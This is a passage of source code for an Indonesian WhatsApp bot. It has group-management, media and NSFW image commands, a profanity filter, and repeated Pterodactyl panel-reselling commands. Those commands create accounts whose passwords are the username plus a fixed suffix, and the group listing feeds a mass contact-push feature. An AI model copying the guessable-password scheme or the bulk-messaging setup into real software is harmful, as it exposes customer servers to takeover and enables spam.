if (!isCreator) return reply(mess.premium)
let getGroups = await kyy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await kyy.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'getidgc':
if (!m.isGroup) return reply('kusus Group')
ewe = `${m.chat}`
await kyy.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'join': {
if (!isCreator) return reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await kyy.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
        break
        case 'removebg': case 'nobg':{
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
await kyy.sendMessage(m.chat, {image: {url: data.url.result}, caption: mess.done}, {quoted:m})
}
break
case 'capcut':{
if (!text) return reply(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await kyy.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
kyy.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: mess.done}, {quoted: m})
await kyy.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await kyy.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
        case 'group': {   
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ᴋʏʏ')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
await loading()
if (args[0] === 'tutup group'){
await kyy.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'buka group'){
await kyy.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
kyy.sendMessage(m.chat, { image: ppnyauser, caption: `ᴄᴏɴᴛᴏʜ ; .ʜᴀɴᴀᴋᴏ ᴛᴜᴛᴜᴘ ɢʀᴏᴜᴘ
ᴄᴏɴᴛᴏʜ : .ʜᴀɴᴀᴋᴏ ʙᴜᴋᴀ ɢʀᴏᴜᴘ`}, {quoted:m}) 
 }
}
break
case "antitoxic":
{
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ᴋʏʏ')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴏ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ʟᴜ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ ɢʀᴏᴜᴘ')
await loading()
if (args.length < 1) return m.reply('ᴏɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴏғғ ᴜɴᴛᴜᴋ ɴᴏɴᴀᴋᴛɪғᴋᴀɴ')
if (args[0] === "on") {
if (welcmm) return m.reply('ᴛᴇʟᴀʜ ᴀᴋᴛɪғ')
wlcmm.push(from)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `ᴀɴᴛɪᴛᴏxɪᴄ sᴜᴄᴄᴇs ᴛʟᴀʜ ᴀᴋᴛɪғ`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('sᴜᴅᴀʜ ɴᴏɴ ᴀᴋᴛɪғ')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break
	case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': case'kontol': case'memek': case'penis': case 'ngewe': case 'yatim': case 'piatu': case 'pentil': case 'pepek': case 'tempi': case 'tempe': case 'bajingan': case 'ndasmu':{
if (!welcmm) return
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (isAdmins) return kyy.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin sudah Toxic, admin bebas Toxic apapun`})
if (isCreator) return kyy.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nOwner telah Toxic, owner bebas Toxic apa pun`})
await kyy.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
kyy.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan toxic di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:kyy})
}
break
//=================================================//
case 'google': {
 if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'couple': {
await loading()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
kyy.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
kyy.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break
//=================================================//
case 'coffe': case 'kopi': {
await loading()
kyy.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:m})
}
break
//=================================================//
case 'getname': {
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
if (qtod === "true") {
namenye = await kyy.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
kyy.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isCreator) return m.reply('*ᴋʜᴜsᴜs ᴋʏʏ*')
await loading()
if (qtod === "true") {
try {
pporg = await kyy.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
kyy.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await kyy.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
kyy.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break


//=================================================//
case "setppbot": {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await kyy.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await kyy.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await kyy.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ᴋʏʏ')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await kyy.downloadAndSaveMediaMessage(m)
await kyy.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break
//=================================================//
case 'block': {
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ᴋʏʏ')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyy.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ᴋʏʏ')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyy.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'neko' :
if (!isPrem) return reply(`Khusus Prem`)
await loading()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
kyy.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺🥺`},{ quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'waifu' :
await loading()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
kyy.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺🙏`}, { quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
await loading()
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
kyy.sendImage(from, data.url, 'Success Coy', m)
})
break
case 'p': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "Hanako AI"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`ʜᴀɴᴀᴋᴏ ᴀɪ ᴏɴ ᴋᴀᴋ`),
                    subtitle: "sɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴀɴ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ᴜɴᴛᴜᴋ ᴍᴇɴᴜ",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"menu\",\"id\":\".menu\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"owner,\"id\":\".owner\"}"
},
 ],
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case 'terimamasih': case 'makasih': {
m.reply(`sama-sama sayanggg`) 
}
break
case 'bot': {
m.reply(`Hanako Siap Membantu`) 
}
break
case 'ramlistv2': {
reply(` - RAM LIST V2 -
- cp1gb
- cp2gb
- cp3gb
- cp4gb
- cp5gb
- cp6gb
- cp7gb
- cp8gb
- cp9gb
- cp10gb
- cpunli

Example Cara Membuat Panel V2
Example : .cp1gb KyyXD
`)
}
break
// BATAS CPANEL V2 DAN V1\\
case '1gb': {
        if (!isPrem) return reply(`ᴋʜᴜsᴜs ᴋʏʏ`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c56d1a0678fb22e4b746b.jpg" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break
case "2gb": {
    if (!isPrem) return reply(`Anda Belum Menjadi Reseler Beli Reseler Skrng Di Kyy agar Bisa Mengakses Fitur Cpanel`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "70"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "3gb": {
    if (!isPrem) return reply(`Anda Belum Menjadi Reseler Beli Reseler Skrng Di Kyy agar Bisa Mengakses Fitur Cpanel`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "100"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break
case "4gb": {
        if (!isPrem) return reply(`Anda Belum Menjadi Reseler Beli Reseler Skrng Di Kyy agar Bisa Mengakses Fitur Cpanel`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "5gb": {
    if (!isPrem) return reply(`Anda Belum Menjadi Reseler Beli Reseler Skrng Di Kyy agar Bisa Mengakses Fitur Cpanel`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "150"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "6gb": {
if (!isPrem) return reply(`*Anda Belum Menjadi Reseler Beli Reseler Skrng Di Kyy agar Bisa Mengakses Fitur Cpanel`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "175"
let disk = "6000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
